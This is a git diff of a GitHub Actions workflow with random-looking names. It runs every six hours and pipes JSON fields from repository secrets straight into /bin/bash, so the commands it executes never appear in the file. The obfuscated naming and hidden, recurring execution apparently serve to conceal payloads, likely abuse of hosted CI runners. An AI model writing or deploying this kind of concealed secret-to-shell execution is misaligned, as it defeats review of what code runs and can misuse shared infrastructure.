@@ -3,8 +3,9 @@ name: yinzhiping2389
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 4/6 * * *'
-jobs:  # 15211
+    - cron: '36 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,21 +13,9 @@ jobs:  # 15211
       - uses: actions/checkout@v4
       - name: yinzhiping2389
         env:
-          csdoj25678: ${{ secrets.csdoj25678 }}
+          kvpb7470: ${{ secrets.kvpb7470 }}
         run: |
-          echo $csdoj25678 | jq -r .dd81452 | /bin/bash
-          echo $xfxen3004 | jq -r .psnzu80 | /bin/bash
-          echo $h25178 | jq -r .n491 | /bin/bash
-          echo $zni6010 | jq -r .iw5 | /bin/bash
-          echo $g0018 | jq -r .etov12857 | /bin/bash
-          echo $ccww1 | jq -r .cclj1321 | /bin/bash
-          echo $clc6247 | jq -r .cuo3 | /bin/bash
-          echo $qi892 | jq -r .kjje121 | /bin/bash
-          echo $keu71215 | jq -r .hhpq3 | /bin/bash
-          echo $fpmku326 | jq -r .phplz684 | /bin/bash
-          echo $lcqm0 | jq -r .osd054 | /bin/bash
-          echo $tk088 | jq -r .vwik61 | /bin/bash
-          echo $j29 | jq -r .e85776 | /bin/bash
-          echo $e037 | jq -r .ck56 | /bin/bash
-          echo $hun4394 | jq -r .z234 | /bin/bash
+          echo $kvpb7470 | jq -r .nvoow8027 | /bin/bash
+          echo $c164 | jq -r .gm93598 | /bin/bash
+          echo $tk8453 | jq -r .e2780 | /bin/bash
 
